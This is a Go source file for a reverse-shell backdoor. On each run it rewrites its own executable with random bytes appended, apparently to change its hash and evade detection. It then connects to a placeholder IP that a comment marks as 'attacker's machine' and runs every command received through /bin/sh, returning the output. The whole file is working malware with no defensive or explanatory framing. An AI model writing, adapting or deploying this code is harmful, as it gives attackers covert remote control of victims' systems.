package main

import (
	"bufio"
	"crypto/rand"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("Error: Failed to retrieve executable path: %s\n", err)
		return
	}

	// Generate random bytes
	randomBytes := make([]byte, 16)
	_, err = rand.Read(randomBytes)
	if err != nil {
		fmt.Printf("Error: Failed to generate random bytes: %s\n", err)
		return
	}

	// Read the content of the executable file
	content, err := ioutil.ReadFile(exePath)
	if err != nil {
		fmt.Printf("Error: Failed to read executable: %s\n", err)
		return
	}

	// Modify the content by appending random bytes
	newContent := append(content, randomBytes...)

	// Create a temporary file with the modified content
	tempFile := exePath + "_temp"
	err = ioutil.WriteFile(tempFile, newContent, 0o777)
	if err != nil {
		fmt.Printf("Error: Failed to write temporary file: %s\n", err)
		return
	}

	// Remove the original executable file
	err = os.Remove(exePath)
	if err != nil {
		fmt.Printf("Error: Failed to remove original executable: %s\n", err)
		return
	}

	// Rename the temporary file to the original executable file name
	err = os.Rename(tempFile, exePath)
	if err != nil {
		fmt.Printf("Error: Failed to overwrite executable: %s\n", err)
		return
	}

	// Establish an SSH-like connection
	createSSHConnection()
}

func createSSHConnection() {
	conn, err := net.Dial("tcp", "xxx.xxx.x.xxx:8080") // Change IP address to attacker's machine
	if err != nil {
		fmt.Printf("Error: Failed to establish connection: %s\n", err)
		return
	}
	defer conn.Close()

	// Continuously receive and process commands from the server
	for {
		// Read a message from the server
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Printf("Error: Failed to read message: %s\n", err)
			return
		}

		command := strings.TrimSpace(message)

		// Handle special commands
		if command == "exit" {
			break
		} else if strings.HasPrefix(command, "cd ") {
			dir := strings.TrimSpace(strings.TrimPrefix(command, "cd "))
			err := os.Chdir(dir)
			if err != nil {
				fmt.Fprintf(conn, "Error: Failed to change directory: %s\n", err)
			} else {
				fmt.Fprintf(conn, "Success: Directory changed to: %s\n", dir)
			}
			continue
		}

		// Execute the command in a shell
		cmd := exec.Command("/bin/sh", "-c", command)
		out, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Fprintf(conn, "Error: Failed to execute command: %s\n", err)
		}
		fmt.Fprintf(conn, "Output:\n%s\n", out)
	}
}
